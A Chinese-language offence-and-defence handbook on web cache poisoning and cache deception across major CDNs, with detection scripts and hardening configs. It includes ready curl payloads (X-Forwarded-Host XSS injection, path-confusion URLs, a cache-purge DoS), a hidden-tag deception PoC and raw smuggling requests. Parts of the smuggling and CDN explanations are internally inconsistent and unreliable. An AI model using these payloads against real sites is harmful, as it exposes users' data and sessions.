---
name: web-cache-attacks
description: >
  全面覆盖 Web 缓存投毒（Cache Poisoning）和缓存欺骗（Cache Deception）的识别、利用、检测和修复。
  涵盖缓存键分析、unkeyed 输入投毒、缓存参数走私、Web 缓存欺骗变体（路径混淆、扩展名欺骗、
  参数注入）、CDN 特定攻击（Cloudflare/Cloudfront/Akamai 缓存行为差异），
  包含缓存投毒 + XSS 组合链、缓存欺骗 + 敏感数据泄露场景，
  以及防御侧的缓存键设计、Cache-Control 头配置、Vary 头正确使用。
domain: cybersecurity
subdomain: web-security
tags: [cache-poisoning, cache-deception, cdn-exploitation, web-cache, cloudflare, varnish, owasp]
version: 2.0.0
---

# Web 缓存攻击 — 完整攻防手册

## 适用场景

- 目标应用使用 CDN（Cloudflare/Cloudfront/Akamai/Fastly）或反向代理缓存（Varnish/Nginx）
- 缓存服务器未正确处理 Cache-Control / Vary 头
- 应用有认证端点返回敏感数据（API 响应、用户信息）
- 渗透测试中需要利用缓存层绕过安全控制或投毒其他用户

**不适用**：无缓存层的应用、纯客户端缓存

---

## Part A：攻击方法论

### 1. 缓存基础概念

```
缓存架构：
Client → CDN/缓存代理 → 源服务器

缓存键（Cache Key）决定哪些请求共享缓存：
- 完整 URL（路径 + 查询参数）
- Host 头
- 部分实现包括：特定查询参数、Cookie、请求头

关键概念：
- Cache Hit: 请求匹配缓存键 → 返回缓存内容
- Cache Miss: 请求不匹配 → 转发到源服务器 → 缓存响应
- unkeyed 输入: 不参与缓存键计算的请求部分（头、Cookie 参数等）

攻击分类：
- 缓存投毒（Cache Poisoning）: 攻击者控制缓存内容，影响其他用户
- 缓存欺骗（Cache Deception）: 源服务器返回敏感数据，缓存服务器错误缓存
```

### 2. 缓存投毒（Cache Poisoning）

#### 2.1 识别 unkeyed 输入

```bash
# 步骤 1：识别缓存行为
# 发送两次相同请求，观察是否命中缓存
curl -s -D- https://target.com/ | grep -i "x-cache\|age\|cf-cache-status"

# 常见缓存标识头
# X-Cache: HIT/MISS
# CF-Cache-Status: HIT/MISS/DYNAMIC (Cloudflare)
# X-Cache-Lookup: HIT/MISS
# Age: <seconds> (缓存时间)
# X-Varnish: <id> (Varnish)

# 步骤 2：测试哪些输入不参与缓存键
# 方法：添加额外头/参数，检查缓存是否区分
curl -s -D- -H "X-Test: value1" https://target.com/ | grep "X-Cache"
curl -s -D- -H "X-Test: value2" https://target.com/ | grep "X-Cache"
# 如果第二次也是 HIT，说明 X-Test 不参与缓存键
```

#### 2.2 unkeyed 头投毒

```bash
# 攻击场景 1：X-Forwarded-Host 投毒
# 假设 X-Forwarded-Host 不参与缓存键
# 页面使用 Host 头构建 JavaScript URL

# 投毒请求
curl -s -D- \
  -H "X-Forwarded-Host: attacker.com" \
  https://target.com/

# 如果源服务器使用 X-Forwarded-Host 构建响应中的 URL：
# <script src="https://attacker.com/js/app.js"></script>
# 且该响应被缓存 → 所有用户收到恶意脚本 URL

# 攻击场景 2：X-Forwarded-Proto 投毒
curl -s -D- \
  -H "X-Forwarded-Proto: https" \
  https://target.com/
# 某些应用根据此头生成规范 URL

# 攻击场景 3：Accept-Language 投毒
# 假设 Accept-Language 不参与缓存键
curl -s -D- \
  -H "Accept-Language: en" \
  https://target.com/
# 如果页面内容根据语言变化且被缓存 → 影响所有用户
```

#### 2.3 unkeyed 查询参数投毒

```bash
# 某些 CDN 只缓存特定路径，忽略某些查询参数
# Cloudflare: 默认忽略查询参数（除特定规则）
# 测试哪些参数被缓存键忽略

# 方法：Param Miner（Burp 扩展）
# 或手动测试
curl -s "https://target.com/?utm_source=normal" -D- | grep "X-Cache"
curl -s "https://target.com/?utm_source=evil" -D- | grep "X-Cache"

# 如果 utm_source 不参与缓存键但影响响应内容：
# 投毒请求：
curl -s "https://target.com/?utm_source=<script>alert(1)</script>" -D-
# 缓存命中后，所有用户看到投毒内容
```

#### 2.4 缓存投毒 + XSS 组合链

```bash
# 组合利用：缓存投毒 → 存储 XSS

# 步骤 1：找到反射型 XSS（通常危害有限，只有自己能看到）
# 步骤 2：找到 unkeyed 输入影响反射点
# 步骤 3：将恶意请求缓存

# 示例：
# 目标: https://target.com/?callback=JSONP_CALLBACK
# callback 参数参与缓存键 → 但 X-Forwarded-Host 不参与

# 投毒请求：
curl -s -D- \
  -H "X-Forwarded-Host: attacker.com\"/><script>alert(document.cookie)</script>" \
  "https://target.com/?callback=normalCallback"

# 源服务器响应中包含 X-Forwarded-Host 的值：
# <meta property="og:url" content="https://attacker.com"/><script>alert(document.cookie)</script>"/>
# 该响应被缓存 → 所有用户触发 XSS
```

#### 2.5 缓存参数走私

```
# 攻击场景：前端缓存和后端对 URL 参数解析不一致
# 前端（CDN）认为两个 URL 相同 → 共享缓存
# 后端认为两个 URL 不同 → 返回不同内容

# 变体 1：参数分隔符差异
# CDN: ?a=1;b=2 → 键为 ?a=1;b=2
# 后端: ?a=1;b=2 → 参数 a=1, b=2（分号当分隔符）
# CDN: ?a=1%3Bb=2 → 键为 ?a=1%3Bb=2（URL 编码）
# 后端: ?a=1%3Bb=2 → 参数 a=1;b=2（URL 解码后解析）

# 变体 2：路径参数走私
# /api/users;admin/dashboard
# CDN 缓存键: /api/users
# 后端路由: /api/users → admin/dashboard

# 变体 3：HTTP 方法覆盖
# CDN 只缓存 GET
# 但后端接受 X-HTTP-Method-Override: PUT
# 通过 unkeyed 头走私 PUT 语义
```

### 3. 缓存欺骗（Cache Deception）

#### 3.1 原理

```
缓存欺骗条件：
1. 目标端点返回敏感数据（需认证）
2. 缓存服务器误将该响应缓存
3. 攻击者可以诱导受害者访问特制 URL

攻击流程：
1. 攻击者构造 URL: https://target.com/api/user/profile/../../static/evil.css
2. 缓存服务器看到路径以 .css 结尾 → 认为是静态资源 → 缓存
3. 源服务器处理路径 → 返回 /api/user/profile（用户敏感数据）
4. 缓存服务器存储敏感数据响应
5. 攻击者访问相同 URL → 获取缓存的敏感数据
```

#### 3.2 路径混淆技术

```bash
# 技术 1：扩展名附加
# 正常: /api/user/profile
# 欺骗: /api/user/profile.css
# /api/user/profile/whatever.js
# /api/user/profile%00.css
# /api/user/profile#.css

# 技术 2：路径穿越
# /api/user/profile/..%2f..%2fstatic%2fevil.css
# /api/user/profile/../../static/evil.css

# 技术 3：分号路径参数
# /api/user/profile;evil.css
# /api/user/profile;lang=en.css

# 技术 4：URL 编码混淆
# /api/user/profile%2F..%2F..%2Fstatic%2Fevil.css
# /api/user/profile/..%252f..%252fstatic%252fevil.css

# 技术 5：大小写混合
# /api/user/profile.CSS
# /api/user/profile.Js

# 技术 6：双扩展名
# /api/user/profile.json.css

# 技术 7：查询参数触发缓存
# /api/user/profile?callback=evil（CDN 缓存 JSONP 响应）
```

#### 3.3 CDN 特定行为

```
# Cloudflare
# 缓存规则：根据 URL 扩展名和 Cache-Control 头
# 默认缓存扩展名：.css, .js, .png, .jpg 等
# 不缓存：无扩展名的路径（除非规则配置）
# 绕过方法：路径添加 .css 等扩展名

# Cloudfront (AWS)
# 缓存规则：基于 Cache-Control 头和 TTL
# 行为路径 (Behavior Path) 配置决定缓存
# 测试：修改 Accept 头影响缓存行为

# Akamai
# 缓存键高度可配置
# 通常包含路径 + 查询参数
# Vary 头行为需要测试

# Fastly
# 基于 VCL 配置
# 默认缓存键包含 Host + URL
# 可以通过 VCL 自定义缓存键

# 测试步骤（通用）：
1. 确认目标使用哪个 CDN（响应头识别）
2. 确认缓存规则（哪些路径/扩展名被缓存）
3. 构造路径混淆 payload
4. 验证缓存命中（X-Cache: HIT）
5. 确认源服务器返回的是敏感数据
```

#### 3.4 缓存欺骗利用 PoC

```html
<!-- 攻击者页面 — 诱骗受害者访问 -->
<img src="https://target.com/api/user/profile.css" style="display:none" />

<!-- 或使用 CSS import -->
<link rel="stylesheet" href="https://target.com/api/user/profile.css" />

<!-- 或使用 JavaScript -->
<script src="https://target.com/api/user/profile.js"></script>

<!-- 攻击者随后访问相同 URL 获取缓存的敏感数据 -->
<!-- curl https://target.com/api/user/profile.css → 返回用户 JSON -->
```

---

## Part B：检测与防御

### 4. 检测方法

#### 4.1 缓存投毒检测

```bash
# 自动化检测工具
# 1. Burp Suite → Web Cache Poisoning Scanner（Param Miner）
# 2. Burp Suite → Cache Poisoning Scanner（PortSwigger）

# 手动检测步骤：
# 步骤 1：识别缓存头
for path in / /login /api/data /static/app.js; do
  echo "=== $path ==="
  curl -sI "https://target.com$path" | grep -iE "cache|age|vary|cf-cache"
done

# 步骤 2：测试 unkeyed 输入
for header in "X-Forwarded-Host" "X-Forwarded-Proto" "X-Forwarded-Scheme" \
  "X-Original-URL" "X-Rewrite-URL" "Accept-Language" "Origin"; do
  echo "=== Testing $header ==="
  # 第一次请求（MISS）
  curl -sI -H "$header: test1" "https://target.com/" | grep -i "x-cache"
  # 第二次请求（应该也是 MISS 如果是 keyed）
  curl -sI -H "$header: test2" "https://target.com/" | grep -i "x-cache"
done

# 步骤 3：分析 Vary 头
# Vary: Accept-Encoding, User-Agent → 这两个是 keyed
# 如果某个头影响响应但不在 Vary 中 → 漏洞
```

#### 4.2 缓存欺骗检测

```bash
# 自动化检测脚本
#!/bin/bash
TARGET="https://target.com"
ENDPOINTS=(
  "/api/user/profile"
  "/api/account/settings"
  "/api/user/email"
  "/api/payment/methods"
)

for endpoint in "${ENDPOINTS[@]}"; do
  echo "=== Testing $endpoint ==="

  # 测试各种路径混淆
  for suffix in ".css" ".js" ".png" ".ico" "/nonexist.css" ";test.css"; do
    url="${TARGET}${endpoint}${suffix}"
    # 第一次请求
    cache1=$(curl -sI "$url" | grep -i "x-cache\|cf-cache-status" | head -1)
    # 第二次请求
    cache2=$(curl -sI "$url" | grep -i "x-cache\|cf-cache-status" | head -1)

    if echo "$cache2" | grep -qi "hit"; then
      echo "[!] CACHE HIT: $url"
      echo "    $cache2"
      # 检查内容是否是敏感数据
      content=$(curl -s "$url" | head -c 200)
      if echo "$content" | grep -q '"email"\|"password"\|"token"\|"api_key"'; then
        echo "[!!!] SENSITIVE DATA CACHED: $url"
      fi
    fi
  done
done
```

### 5. 防御措施

#### 5.1 缓存投毒防御

```nginx
# Nginx — 安全缓存配置

# 1. 明确定义缓存键
proxy_cache_key "$scheme$host$request_uri";

# 2. 包含所有影响响应的头
proxy_cache_key "$scheme$host$request_uri$http_accept_language";
# 或使用 Vary 头
add_header Vary "Accept-Language, X-Forwarded-Proto";

# 3. 不缓存动态内容
location /api/ {
    proxy_cache off;  # 禁用 API 缓存
    add_header Cache-Control "no-store, no-cache, must-revalidate";
    add_header Pragma "no-cache";
}

# 4. 只缓存明确标记为可缓存的内容
location /static/ {
    proxy_cache my_cache;
    proxy_cache_valid 200 7d;
    # 只缓存 200 响应
}
```

```
# 应用层防御
# 1. 正确设置 Vary 头
# Vary 头告诉缓存服务器哪些请求头参与缓存键判断
Vary: Accept, Accept-Language, Authorization

# 2. 敏感响应禁止缓存
Cache-Control: no-store, no-cache, must-revalidate, private
Pragma: no-cache

# 3. 不信任代理头
# 不要使用 X-Forwarded-Host 构建绝对 URL
# 使用配置的已知域名而非请求头

# 4. CDN 特定配置
# Cloudflare: 使用 Page Rules / Cache Rules 明确指定不缓存的路径
# Cloudfront: 使用 Behavior 配置正确设置缓存策略
# Fastly: VCL 中明确定义缓存键
```

#### 5.2 缓存欺骗防御

```nginx
# Nginx — 防止缓存欺骗

# 1. 认证端点设置禁止缓存头
location /api/ {
    add_header Cache-Control "no-store, private, no-cache, must-revalidate" always;
    add_header Pragma "no-cache" always;
    add_header Expires "0" always;
}

# 2. 路径规范化（防止路径混淆）
location ~* ^/api/(.*)(\.css|\.js|\.png|\.jpg|\.gif|\.ico)$ {
    # 拒绝对 API 路径的静态文件扩展名请求
    return 404;
}

# 3. 使用通配符拒绝路径穿越
location ~* ^/api/.*\.\.(\/|\\) {
    return 403;
}
```

```python
# 应用层防御 — 确保敏感响应不被缓存
from flask import Flask, jsonify, make_response

app = Flask(__name__)

@app.route('/api/user/profile')
def user_profile():
    user = get_current_user()
    response = make_response(jsonify(user.to_dict()))
    # 强制禁止缓存
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, private, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    # 添加 Vary 头
    response.headers['Vary'] = 'Authorization, Cookie'
    return response

# 中间件：对所有 API 响应添加防缓存头
@app.after_request
def add_security_headers(response):
    if request.path.startswith('/api/'):
        response.headers['Cache-Control'] = 'no-store, private'
    return response
```

```
# CDN 配置最佳实践
# 1. 不缓存 /api/* 路径
# 2. 只缓存 /static/* 路径
# 3. 路径规范化后匹配缓存规则
# 4. 缓存规则基于路径前缀而非扩展名
# 5. 对认证请求始终返回 Cache-Control: private
```

---

## 速查表

### 缓存攻击类型对比

| 类型 | 攻击者控制 | 受害者影响 | 条件 |
|------|-----------|-----------|------|
| 缓存投毒 | unkeyed 输入 | 所有缓存命中用户 | unkeyed 输入影响响应 |
| 缓存欺骗 | 构造 URL | 特定用户（需已认证） | 源服务器忽略路径混淆 |
| 缓存参数走私 | URL 差异 | 缓存命中用户 | CDN/源站 URL 解析差异 |

### CDN 缓存行为速查

| CDN | 默认缓存键 | 默认缓存扩展名 | 特殊行为 |
|-----|-----------|---------------|---------|
| Cloudflare | URL (含查询参数) | .css, .js, .img 等 | 可忽略查询参数 |
| Cloudfront | URL + Host | 无（需配置） | 基于 Behavior 路径 |
| Akamai | 可配置 | .css, .js, .img 等 | Vary 头支持 |
| Fastly | Host + URL | 无（需 VCL） | 高度可自定义 |
| Varnish | URL + Host | 可配置 | VCL 完全控制 |

### 路径混淆技术速查

| 技术 | Payload 示例 | 绕过场景 |
|------|-------------|---------|
| 扩展名附加 | `/api/user.css` | CDN 缓存静态扩展名 |
| 分号参数 | `/api/user;evil.css` | 路径参数混淆 |
| 路径穿越 | `/api/user/..%2fstatic%2fevil.css` | 路径解析差异 |
| 双扩展名 | `/api/user.json.css` | 扩展名优先级差异 |
| URL 编码 | `/api/user%2Ecss` | 解码时机差异 |
| 大小写 | `/api/user.CSS` | 大小写敏感差异 |
| 空字节 | `/api/user%00.css` | 截断差异 |
| Hash | `/api/user#.css` | Hash 处理差异 |

---

## MITRE ATT&CK 映射

| Tactic | Technique ID | Technique Name | 本 Skill 覆盖 |
|--------|-------------|----------------|---------------|
| Initial Access | T1189 | Drive-by Compromise | 缓存投毒 + XSS |
| Credential Access | T1539 | Steal Web Session Cookie | 缓存欺骗窃取数据 |
| Defense Evasion | T1027 | Obfuscated Files | 路径混淆绕过 |
| Lateral Movement | T1210 | Exploitation of Remote Services | CDN 层攻击 |
| Exfiltration | T1041 | Exfiltration Over C2 | 缓存欺骗数据泄露 |

---

## 前置条件

- 理解 HTTP 缓存机制（Cache-Control、ETag、Vary、Age）
- 理解 CDN 工作原理（Cloudflare/Cloudfront/Akamai/Fastly）
- Burp Suite（Repeater、Param Miner、Scanner）
- curl 用于手动测试缓存行为
- 理解 URL 路径规范化差异
- 目标应用使用缓存层（CDN 或反向代理缓存）

---

## Part C：2025-2026 更新

> 基于 PortSwigger Research "Gotta Cache 'Em All"、USENIX WCD 学术研究、Cloudflare/Akamai 官方公告等最新资料补充。

### 6. Web Cache Deception (WCD) vs Web Cache Poisoning (WCP) 对比

```
┌──────────────────┬──────────────────────────┬──────────────────────────┐
│ 维度             │ WCP (缓存投毒)            │ WCD (缓存欺骗)            │
├──────────────────┼──────────────────────────┼──────────────────────────┤
│ 攻击者目标       │ 向缓存注入恶意内容        │ 让缓存存储敏感用户数据    │
│ 攻击者控制       │ unkeyed 输入 (头/参数)    │ 构造特制 URL (路径混淆)   │
│ 受害者触发       │ 访问被投毒的缓存页面      │ 攻击者主动获取缓存副本    │
│ 影响范围         │ 所有命中该缓存的用户      │ 单个认证用户的数据        │
│ 核心条件         │ unkeyed 输入影响响应      │ 源站忽略路径混淆 + CDN    │
│                  │ 且响应被缓存              │ 误判为静态资源            │
│ 典型危害         │ 存储 XSS / 开放重定向     │ 敏感数据泄露 (PII/Token)  │
│ 发现难度         │ 高 (需找 unkeyed 输入)    │ 中 (需找路径解析差异)     │
│ 修复难度         │ 中 (规范化缓存键)         │ 中 (规范化路径 + 头配置)  │
│ CVSS 典型评分    │ 6.5-8.5                  │ 5.3-7.5                  │
│ CWE              │ CWE-444                  │ CWE-444 / CWE-200        │
└──────────────────┴──────────────────────────┴──────────────────────────┘

关键区别：
- WCP 是 "写入投毒"：攻击者写入缓存，受害者读取
- WCD 是 "读取欺骗"：受害者写入缓存（通过访问特制URL），攻击者读取
- 两者可组合使用：先用 WCP 注入恶意 JS，再用 WCD 窃取数据
```

### 7. CDN 特定绕过技术 (2025 更新)

#### 7.1 Cloudflare

```bash
# Cloudflare Cache Deception Armor (2024+ 默认启用)
# 防护机制：检测路径与 Content-Type 不匹配时拒绝缓存
# 绕过思路：

# 绕过 1：Content-Type 匹配欺骗
# 如果源站返回 Content-Type: text/css 即使是 JSON 数据
# Cloudflare 会认为路径与内容类型匹配 → 缓存
curl -sI "https://target.com/api/user/profile.css" | grep -i "content-type\|cf-cache"

# 绕过 2：利用 Cloudflare Workers 修改缓存行为
# 如果目标使用 Workers，Worker 可能覆盖 Cache Deception Armor
# 检查响应头中是否有 cf-worker 相关标识

# 绕过 3：利用 Cloudflare Cache Rules（新特性，替代 Page Rules）
# 某些管理员配置的 Cache Rules 可能过于宽松
# 测试路径：
curl -sI "https://target.com/api/user/profile/..;/static/test.css"
curl -sI "https://target.com/api/user/profile%23.css"  # # 编码
curl -sI "https://target.com/cdn-cgi/trace"  # 信息泄露

# 绕过 4：Cloudflare APO (Automatic Platform Optimization)
# WordPress 专用，可能缓存更多内容
# 测试 WordPress REST API 端点
curl -sI "https://target.com/wp-json/wp/v2/users.css"

# Cloudflare 缓存键默认行为（2025）：
# - 包含：完整 URL（路径 + 查询参数）
# - 不包含：Cookie, Authorization, 大多数请求头
# - Sort Query String: 默认启用（参数排序后计算键）
# - Ignore Query String: 可在 Cache Rules 中配置
```

#### 7.2 Akamai

```bash
# Akamai 缓存键高度可配置，但默认行为有已知弱点

# 绕过 1：利用 Akamai 缓存键层次结构
# Akamai 使用 "Cache Key Hierarchy" 
# 某些配置下查询参数被忽略
curl -sI "https://target.com/api/user/profile?x=test.css" | grep -i "x-cache"

# 绕过 2：Akamai GTM (Global Traffic Management) 路径解析
# 路径标准化差异
curl -sI "https://target.com/api/user/profile;/../static/evil.css"
curl -sI "https://target.com/api/user/profile%2F..%2Fstatic%2Fevil.css"

# 绕过 3：Akamai Image Manager 缓存
# 图片优化功能可能缓存 API 响应（如果误判为图片请求）
curl -sI -H "Accept: image/webp" "https://target.com/api/avatar/123"

# Akamai 调试头（如果暴露）：
# X-Cache: TCP_HIT/TCP_MISS
# X-Akamai-Session-Info: (泄露缓存信息)
# X-Akamai-Transformed: (内容转换标识)
# X-Cache-Key: (直接暴露缓存键！高危)
```

#### 7.3 Fastly

```bash
# Fastly 基于 VCL，缓存行为完全自定义

# 绕过 1：VCL 默认缓存键只含 Host + URL
# 如果 VCL 未正确处理 Accept 头 → 内容协商攻击
curl -sI -H "Accept: application/json" "https://target.com/api/data.css"
curl -sI -H "Accept: text/html" "https://target.com/api/data.css"

# 绕过 2：Fastly 的 req.hash 设置
# 如果 VCL 中 hash 不包含 Cookie/Authorization
# 认证和非认证用户共享缓存
curl -sI -H "Authorization: Bearer $TOKEN" "https://target.com/api/private.css"

# 绕过 3：Fastly Surrogate-Key 缓存失效机制
# 利用 Surrogate-Key 头触发批量缓存清除（DoS）
curl -sI -H "Surrogate-Key: all" "https://target.com/api/data"

# Fastly 调试头：
# X-Cache: HIT, MISS
# X-Cache-Hits: <count>
# X-Served-By: cache-<location>
# X-Timer: <timing_info>
```

#### 7.4 CloudFront (AWS)

```bash
# CloudFront 缓存基于 Behavior 配置

# 绕过 1：Behavior 路径模式过于宽泛
# 例如 Path Pattern: /api/* → 所有 API 路径被缓存
curl -sI "https://target.com/api/user/profile.css"

# 绕过 2：CloudFront 缓存键策略（Cache Policy）
# 如果 Cache Policy 的 Query Strings = None / Whitelist
# 某些参数被忽略
curl -sI "https://target.com/api/data?format=json.css"

# 绕过 3：Origin Request Policy 与 Cache Policy 不一致
# Origin Request Policy 转发头但 Cache Policy 不包含在缓存键中
curl -sI -H "Accept-Language: en" "https://target.com/"
curl -sI -H "Accept-Language: zh" "https://target.com/"
# 如果两次都 HIT 且内容不同 → unkeyed Accept-Language

# 绕过 4：CloudFront Functions / Lambda@Edge 修改响应
# Edge 函数可能移除 Cache-Control 头 → 导致意外缓存

# CloudFront 调试头：
# X-Cache: Hit from cloudfront / Miss from cloudfront
# X-Amz-Cf-Id: <request_id>
# Via: 1.1 <id>.cloudfront.net (CloudFront)
# Age: <seconds>
```

#### 7.5 Varnish

```bash
# Varnish 完全通过 VCL 控制，行为取决于配置

# 绕过 1：VCL 的 hash_data() 未包含关键头
# 默认 VCL 只 hash req.url（含查询参数）
sub vcl_hash {
    hash_data(req.url);  # 未包含 Host, Cookie 等
}

# 绕过 2：VCL 的 beresp.ttl 设置过长
# 如果 VCL 未检查 Content-Type 就设置长 TTL
sub vcl_backend_response {
    set beresp.ttl = 24h;  # 所有响应缓存 24 小时！
}

# 绕过 3：VCL 正则匹配不严格
# 缓存规则基于路径正则 → 可能匹配到 API 路径
if (req.url ~ "\.(css|js|png)$") {
    return (pass);  # 但如果正则写错，可能不匹配
}

# 绕过 4：Varnish 的 saint mode / grace mode
# 即使源站返回错误，grace mode 可能继续提供缓存内容
# 利用：投毒缓存后，即使源站修复，缓存仍然提供恶意内容
```

### 8. HTTP Cache Headers 完整指南

```
┌───────────────────────────┬──────────────────────────────────────────────┐
│ Header                    │ 说明与安全影响                                │
├───────────────────────────┼──────────────────────────────────────────────┤
│ Cache-Control             │ 缓存策略核心头                               │
│  no-store                 │ 完全不缓存（敏感数据必须）                    │
│  no-cache                 │ 缓存前必须验证（需 ETag/Last-Modified）      │
│  must-revalidate          │ 过期后必须验证，不使用 stale 缓存            │
│  private                  │ 只允许浏览器缓存，中间缓存不能存储            │
│  public                   │ 允许中间缓存存储                              │
│  max-age=<seconds>        │ 缓存有效期（相对时间）                        │
│  s-maxage=<seconds>       │ 共享缓存（CDN）有效期，覆盖 max-age          │
│  stale-while-revalidate   │ 允许后台验证时返回过期缓存                    │
│  stale-if-error           │ 允许错误时返回过期缓存                        │
│  no-transform             │ 不允许中间代理修改响应体                      │
│  immutable                │ 有效期内不验证（适合静态资源）                │
├───────────────────────────┼──────────────────────────────────────────────┤
│ Vary                      │ 缓存键包含的请求头                            │
│  Vary: Accept-Encoding    │ 不同压缩算法用不同缓存                        │
│  Vary: Authorization      │ 认证用户不共享缓存（关键安全头）              │
│  Vary: Cookie             │ 不同 Cookie 用不同缓存                        │
│  Vary: *                  │ 等同于 no-store（不缓存）                     │
│  Vary: Origin             │ CORS 场景区分来源                             │
│                           │ ⚠ 安全问题：缺少必要头 = 缓存投毒风险         │
├───────────────────────────┼──────────────────────────────────────────────┤
│ Age                       │ 缓存已存储的秒数                              │
│                           │ Age: 0 = 刚缓存；缺失 = 未缓存或浏览器缓存   │
│                           │ 用于判断缓存命中时间和 TTL 剩余               │
├───────────────────────────┼─────────────────────────────────────────────┤
│ X-Cache                   │ 缓存命中状态（非标准但广泛使用）              │
│  HIT                      │ 命中缓存                                      │
│  MISS                     │ 未命中，从源站获取                            │
│  EXPIRED                  │ 缓存已过期                                    │
│  STALE                    │ 使用过期缓存                                  │
│  BYPASS                   │ 跳过缓存                                      │
├───────────────────────────┼──────────────────────────────────────────────┤
│ CF-Cache-Status           │ Cloudflare 专用缓存状态                      │
│  HIT / MISS / EXPIRED     │ 基本状态                                      │
│  DYNAMIC                  │ 不缓存（动态内容）                            │
│  UPDATING                 │ 正在更新缓存                                  │
│  REVALIDATED              │ 已验证缓存有效性                              │
│  STALE                    │ 使用过期缓存                                  │
│  BYPASS                   │ 跳过（Cache-Control 阻止）                    │
├───────────────────────────┼──────────────────────────────────────────────┤
│ ETag / If-None-Match      │ 条件请求（验证缓存有效性）                    │
│                           │ ETag: "abc123"                                │
│                           │ If-None-Match: "abc123" → 304 Not Modified    │
├───────────────────────────┼──────────────────────────────────────────────┤
│ Last-Modified             │ 资源最后修改时间                              │
│ / If-Modified-Since       │ If-Modified-Since → 304 Not Modified          │
├───────────────────────────┼──────────────────────────────────────────────┤
│ Surrogate-Control         │ CDN 专用缓存指令（覆盖 Cache-Control）        │
│  Surrogate-Control:       │                                               │
│   max-age=3600            │ CDN 缓存 1 小时，浏览器可能不缓存             │
├───────────────────────────┼──────────────────────────────────────────────┤
│ X-Cache-Key               │ 部分CDN暴露实际缓存键（信息泄露）             │
│                           │ ⚠ 泄露缓存键结构 = 简化攻击                  │
├───────────────────────────┼──────────────────────────────────────────────┤
│ Pragma                    │ HTTP/1.0 遗留头                               │
│  Pragma: no-cache         │ 等同于 Cache-Control: no-cache                │
│                           │ 现代 CDN 可能忽略此头                         │
├───────────────────────────┼──────────────────────────────────────────────┤
│ Expires                   │ HTTP/1.0 过期时间（绝对时间）                 │
│                           │ 被 Cache-Control: max-age 覆盖                │
│                           │ Expires: 0 / Expires: Thu, 01 Dec 1994 ...    │
└───────────────────────────┴──────────────────────────────────────────────┘

安全配置决策树：
                                    返回的内容是敏感数据吗？
                                    /                    \
                                  是                      否
                                  |                       |
                        Cache-Control:            内容影响安全吗？
                        no-store, private          /            \
                        Vary: Authorization      是              否
                        Pragma: no-cache          |               |
                                                  需要区分用户？   正常缓存策略
                                                  |               Cache-Control: public
                                                Vary: Cookie     max-age=86400
                                                或 Authorization  immutable
                                                  |
                                                Cache-Control: private
                                                no-cache
                                                Vary: Cookie
```

### 9. 缓存键注入 (Cache Key Injection)

```
攻击原理：
  缓存键的构建过程中，如果未正确清理输入，攻击者可以注入额外内容到缓存键中，
  导致不同用户请求被映射到同一个缓存条目，或者绕过缓存键的限制。

攻击变体 1：换行注入分割缓存键
  某些 CDN 在构建缓存键时使用换行符分隔各部分
  如果查询参数值包含 \r\n → 可能截断缓存键

  正常缓存键: GET /api/data\nHost: target.com
  注入后:     GET /api/data\nHost: target.com\nX-Evil: injected
  
  请求：
  curl "https://target.com/api/data?param=value%0d%0aX-Injected:%20true"

攻击变体 2：Host 头污染缓存键
  如果缓存键包含 Host 头但未验证
  curl -H "Host: target.com.evil.com" https://cdn-target.com/
  缓存键: target.com.evil.com + /
  可能匹配到其他用户请求

攻击变体 3：Query String 排序绕过
  Cloudflare 默认排序查询参数后计算缓存键
  ?a=1&b=2 和 ?b=2&a=1 → 相同缓存键
  但如果源站不排序 → 参数顺序影响响应 → 缓存投毒

  CDN 缓存键: /api?a=1&b=2 (排序后)
  源站处理: /api?a=1&b=2 (原始顺序) → 返回内容A
  另一用户: /api?b=2&a=1 → CDN 认为相同键 → 返回内容A
  但源站对 ?b=2&a=1 返回内容B → 如果缓存被投毒为内容B → 所有用户收到内容B

攻击变体 4：路径参数注入
  # Semicolon 参数被某些 CDN 视为路径参数（不参与缓存键）
  # 但源站解析为查询参数
  curl "https://target.com/api/data;malicious_param=evil"
  # CDN 缓存键: /api/data (忽略分号后内容)
  # 源站解析: 参数 malicious_param=evil → 影响响应
  # 结果：投毒的响应被缓存

自动化检测：
  # 使用 Burp Param Miner 的 "Guess cache keys" 功能
  # 或手动测试：
  for param in "x-test" "callback" "_" "timestamp" "rand" "v"; do
    resp1=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/?${param}=1")
    resp2=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/?${param}=2")
    if [ "$resp1" = "$resp2" ]; then
      echo "[?] $param 可能不参与缓存键 (相同状态码)"
    fi
  done
```

### 10. HTTP Request Smuggling + Cache Poisoning 组合攻击

```
攻击原理：
  HTTP Request Smuggling 利用前端代理（CDN）和后端服务器对 Content-Length / 
  Transfer-Encoding 的解析差异，将恶意请求 "走私" 到后端。
  结合缓存投毒，攻击者可以将走私的恶意响应缓存，影响所有后续用户。

攻击链：
  1. 攻击者发送走私请求（CL.TE 或 TE.CL）
  2. 前端 CDN 转发请求到后端
  3. 后端解析出走私的恶意请求
  4. 后端返回恶意响应
  5. CDN 将恶意响应缓存（关联到正常 URL）
  6. 所有后续用户收到缓存的恶意响应

CL.TE + Cache Poisoning 示例：
  POST / HTTP/1.1
  Host: target.com
  Content-Length: 150
  Transfer-Encoding: chunked
  
  0
  
  GET /index.html HTTP/1.1
  Host: target.com
  X-Forwarded-Host: attacker.com
  Content-Length: 0
  
  
  解析过程：
  - CDN (前端)：读取 Content-Length: 150 → 认为整个请求体是 150 字节
    看到第一个请求结束（chunked 0），认为走私内容是下一个请求的开始
  - 后端 (源站)：读取 Transfer-Encoding: chunked → 第一个请求在 0 处结束
    解析走私的 GET /index.html，包含 X-Forwarded-Host: attacker.com
  - 后端返回包含 attacker.com 的响应
  - CDN 将此响应与 /index.html 关联并缓存
  - 所有访问 /index.html 的用户收到投毒响应

TE.CL + Cache Poisoning 示例：
  POST / HTTP/1.1
  Host: target.com
  Content-Length: 4
  Transfer-Encoding: chunked
  
  5c
  GET /api/admin/users HTTP/1.1
  Host: target.com
  Content-Type: application/x-www-form-urlencoded
  Cookie: session=admin_session_token
  
  0
  
  解析过程：
  - CDN：按 chunked 读取，看到走私的 GET /api/admin/users
  - 后端：按 Content-Length 读取，只读 4 字节
  - 下一个正常用户的请求被后端匹配到走私的 admin 请求
  - admin 数据被缓存到正常 URL

检测方法：
  # 步骤 1：确认走私可能性
  # 使用 HTTP Request Smuggling 检测工具
  # Burp HTTP Smuggler / smuggler.py
  
  # 步骤 2：确认缓存行为
  curl -sI "https://target.com/" | grep -i "x-cache\|age"
  
  # 步骤 3：组合测试
